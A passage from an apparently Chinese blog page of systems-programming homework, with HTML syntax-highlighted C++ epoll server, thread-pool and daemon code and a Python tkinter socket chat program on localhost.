punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"get "</span> <span class="token operator">&lt;&lt;</span> ret <span class="token operator">&lt;&lt;</span> <span class="token string">" bytes of content: "</span> <span class="token operator">&lt;&lt;</span> buf <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"something else happened\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"usage: "</span> <span class="token operator">&lt;&lt;</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" ip_address port_number"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> ip <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> port <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> address<span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    address<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    <span class="token function">inet_pton</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">.</span>sin_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    address<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> listen_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ret <span class="token operator">=</span> <span class="token function">bind</span><span class="token punctuation">(</span>listen_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ret <span class="token operator">=</span> <span class="token function">listen</span><span class="token punctuation">(</span>listen_fd<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    epoll_event events<span class="token punctuation">[</span>MAX_EVENTS<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> epoll_fd <span class="token operator">=</span> <span class="token function">epoll_create</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">add_fd</span><span class="token punctuation">(</span>epoll_fd<span class="token punctuation">,</span> listen_fd<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">epoll_wait</span><span class="token punctuation">(</span>epoll_fd<span class="token punctuation">,</span> events<span class="token punctuation">,</span> MAX_EVENTS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"epoll failure\n"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// lt(events, ret, epoll_fd, listen_fd);</span>        <span class="token function">et</span><span class="token punctuation">(</span>events<span class="token punctuation">,</span> ret<span class="token punctuation">,</span> epoll_fd<span class="token punctuation">,</span> listen_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">close</span><span class="token punctuation">(</span>listen_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ul><h3 id="作业8">作业8</h3><ul><li><p><strong>线程池</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;condition_variable></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;functional></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;mutex></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;queue></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;thread></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token keyword">class</span> <span class="token class-name">ThreadPool</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>        <span class="token function">ThreadPool</span><span class="token punctuation">(</span>size_t num_threads<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">stopped</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> num_threads<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>                threads<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        std<span class="token double-colon punctuation">::</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> task<span class="token punctuation">;</span>                        <span class="token punctuation">&#123;</span>                            std<span class="token double-colon punctuation">::</span>unique_lock<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>mutex<span class="token operator">></span> <span class="token function">lock</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>                            condition<span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span>                                lock<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> stopped <span class="token operator">||</span> <span class="token operator">!</span>tasks<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>stopped <span class="token operator">&amp;&amp;</span> tasks<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                <span class="token keyword">return</span><span class="token punctuation">;</span>                            task <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>tasks<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            tasks<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                        <span class="token function">task</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token operator">~</span><span class="token function">ThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#123;</span>            std<span class="token double-colon punctuation">::</span>unique_lock<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>mutex<span class="token operator">></span> <span class="token function">lock</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>            stopped <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        condition<span class="token punctuation">.</span><span class="token function">notify_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>thread<span class="token operator">&amp;</span> thread <span class="token operator">:</span> threads<span class="token punctuation">)</span>            thread<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">F</span><span class="token punctuation">,</span> <span class="token keyword">class</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> Args<span class="token operator">></span>    <span class="token keyword">void</span> <span class="token function">enqueue</span><span class="token punctuation">(</span>F<span class="token operator">&amp;&amp;</span> f<span class="token punctuation">,</span> Args<span class="token operator">&amp;&amp;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#123;</span>            std<span class="token double-colon punctuation">::</span>unique_lock<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>mutex<span class="token operator">></span> <span class="token function">lock</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>            tasks<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>                <span class="token punctuation">[</span><span class="token operator">=</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">forward</span><span class="token generic class-name"><span class="token operator">&lt;</span>F<span class="token operator">></span></span></span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">forward</span><span class="token generic class-name"><span class="token operator">&lt;</span>Args<span class="token operator">></span></span></span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        condition<span class="token punctuation">.</span><span class="token function">notify_one</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token keyword">private</span><span class="token operator">:</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>thread<span class="token operator">></span> threads<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>queue<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span> tasks<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>mutex m<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>condition_variable condition<span class="token punctuation">;</span>    <span class="token keyword">bool</span> stopped<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ul><h3 id="作业7">作业7</h3><ul><li><p><strong>守护进程</strong>：创建子进程执行各种任务，而守候进程在后台保证系统稳定运行</p><pre class="language-Cpp" data-language="Cpp"><code class="language-Cpp">#include &lt;unistd.h&gt;#include &lt;sys&#x2F;stat.h&gt;#include &lt;sys&#x2F;types.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;void daemonize() &#123;    pid_t pid, sid;    &#x2F;&#x2F; fork off the parent process    pid &#x3D; fork();    if (pid &lt; 0) &#123;        exit(EXIT_FAILURE);    &#125;    if (pid &gt; 0) &#123;        exit(EXIT_SUCCESS);    &#125;    &#x2F;&#x2F; create a new session    sid &#x3D; setsid();    if (sid &lt; 0) &#123;        exit(EXIT_FAILURE);    &#125;    &#x2F;&#x2F; fork off for the second time    pid &#x3D; fork();    if (pid &lt; 0) &#123;        exit(EXIT_FAILURE);    &#125;    if (pid &gt; 0) &#123;        exit(EXIT_SUCCESS);    &#125;    &#x2F;&#x2F; change the current working directory to root    if (chdir(&quot;&#x2F;&quot;) &lt; 0) &#123;        exit(EXIT_FAILURE);    &#125;    &#x2F;&#x2F; close standard file descriptors    close(STDIN_FILENO);    close(STDOUT_FILENO);    close(STDERR_FILENO);    &#x2F;&#x2F; core logic of the daemon process    while (1) &#123;        &#x2F;&#x2F; do something useful here    &#125;    &#x2F;&#x2F; cleanup resources when the daemon process exits    exit(EXIT_SUCCESS);&#125;int main() &#123;    daemonize();    return 0;&#125;</code></pre></li></ul><h3 id="作业6">作业6</h3><ul><li><p><strong>需求</strong>：</p><p>使用python网络编程实现聊天程序：A和B（服务器和客户端）之间可以互相发送消息</p><ul><li><strong>给客户端程序加上交互界面</strong><ul><li>标题：chat online</li><li>接受消息的框</li><li>发送消息的框，且右侧附有发送按钮（enter键可发送消息）</li><li>且发送消息和接收的消息按顺序显示在页面上</li></ul></li><li>服务端功能和界面与客户端基本一致（需要监听功能）</li></ul></li><li><p><strong>代码</strong></p><ul><li><p>服务端</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">import</span> socket<span class="token keyword">class</span> <span class="token class-name">ServerUI</span><span class="token punctuation">:</span>    HOST <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>    PORT <span class="token operator">=</span> <span class="token number">8080</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> root<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Start server</span>        self<span class="token punctuation">.</span>server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Server started. Waiting for client to connect..."</span><span class="token punctuation">)</span>        <span class="token comment"># Accept client connection</span>        self<span class="token punctuation">.</span>client_socket<span class="token punctuation">,</span> self<span class="token punctuation">.</span>client_address <span class="token operator">=</span> self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Client connected from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>client_address<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>root <span class="token operator">=</span> root        self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Chat Oline"</span><span class="token punctuation">)</span>        <span class="token comment"># Create text box for displaying messages</span>        self<span class="token punctuation">.</span>text_box <span class="token operator">=</span> tk<span class="token punctuation">.</span>Text<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>text_box<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Create entry box for sending messages</span>        self<span class="token punctuation">.</span>entry_box <span class="token operator">=</span> tk<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>entry_box<span class="token punctuation">.</span>configure<span class="token punctuation">(</span>bg<span class="token operator">=</span><span class="token string">"white"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>entry_box<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">"&lt;Return>"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>send_message<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>entry_box<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Create send button</span>        self<span class="token punctuation">.</span>send_button <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>            root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Send"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>self<span class="token punctuation">.</span>send_message<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>send_button<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Start handling incoming messages</span>        self<span class="token punctuation">.</span>receive_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>schedule_receive<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>receive_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">schedule_receive</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment"># Schedule the receive function to be called in 100 milliseconds</span>            self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>receive<span class="token punctuation">)</span>            <span class="token comment"># Wait for receive function to finish</span>            self<span class="token punctuation">.</span>receive_thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">receive</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># Receive message from client</span>            msg <span class="token operator">=</span> self<span class="token punctuation">.</span>client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> msg <span class="token operator">==</span> <span class="token string">"Bye"</span><span class="token punctuation">:</span>                <span class="token comment"># Client has disconnected, so close the client socket</span>                self<span class="token punctuation">.</span>client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token comment"># Display message in text box</span>            self<span class="token punctuation">.</span>text_box<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tk<span class="token punctuation">.</span>END<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Client : </span><span class="token interpolation"><span class="token punctuation">&#123;</span>msg<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>        <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>            <span class="token comment"># Client has disconnected, so close the client socket</span>            self<span class="token punctuation">.</span>client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>    <span class="token keyword">def</span> <span class="token function">send_message</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Get message from entry box</span>        msg <span class="token operator">=</span> self<span class="token punctuation">.</span>entry_box<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Send message to client</span>        self<span class="token punctuation">.</span>client_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># Display message in text box</span>        self<span class="token punctuation">.</span>text_box<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tk<span class="token punctuation">.</span>END<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"You: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>msg<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>        <span class="token comment"># Clear entry box</span>        self<span class="token punctuation">.</span>entry_box<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> tk<span class="token punctuation">.</span>END<span class="token punctuation">)</span><span class="token comment"># Create server UI</span>root <span class="token operator">=</span> tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>server_ui <span class="token operator">=</span> ServerUI<span class="token punctuation">(</span>root<span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li><li><p>另一端</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">import</span> socket<span class="token keyword">class</span> <span class="token class-name">ServerUI</span><span class="token punctuation">:</span>    HOST <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>    PORT <span class="token operator">=</span> <span class="token number">8080</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> root<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Start server</span>        self<span class="token punctuation">.</span>server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Server started. Waiting for client to connect..."</span><span class="token punctuation">)</span>        <span class="token comment"># Accept client connection</span>        self<span class="token punctuation">.</span>client_socket<span class="token punctuation">,</span> self<span class="token punctuation">.</span>client_address <span class="token operator">=</span> self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Client connected from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>client_address<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>root <span class="token operator">=</span> root        self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"Chat Oline"</span><span class="token punctuation">)</span>        <span class="token comment"># Create text box for displaying messages</span>        self<span class="token punctuation">.</span>text_box <span class="token operator">=</span> tk<span class="token punctuation">.</span>Text<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>text_box<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Create entry box for sending messages</span>        self<span class="token punctuation">.</span>entry_box <span class="token operator">=</span> tk<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>root<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>entry_box<span class="token punctuation">.</span>configure<span class="token punctuation">(</span>bg<span class="token operator">=</span><span class="token string">"white"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>entry_box<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">"&lt;Return>"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>send_message<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>entry_box<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Create send button</span>        self<span class="token punctuation">.</span>send_button <span class="token operator">=</span> tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>            root<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"Send"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>self<span class="token punctuation">.</span>send_message<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>send_button<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># Start handling incoming messages</span>        self<span class="token punctuation">.</span>receive_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>schedule_receive<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>receive_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">schedule_receive</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment"># Schedule the receive function to be called in 100 milliseconds</span>            self<span class="token punctuation">.</span>root<span class="token punctuation">.</span>after<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>receive<span class="token punctuation">)</span>            <span class="token comment"># Wait for receive function to finish</span>            self<span class="token punctuation">.</span>receive_thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">receive</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># Receive message from client</span>            msg <span class="token operator">=</span> self<span class="token punctuation">.</span>client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> msg <span class="token operator">==</span> <span class="token string">"Bye"</span><span class="token punctuation">:</span>                <span class="token comment"># Client has disconnected, so close the client socket</span>                self<span class="token punctuation">.</span>client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token comment"># Display message in text box</span>            self<span class="token punctuation">.</span>text_box<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tk<span class="token punctuation">.</span>END<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Client : </span><span class="token interpolation"><span 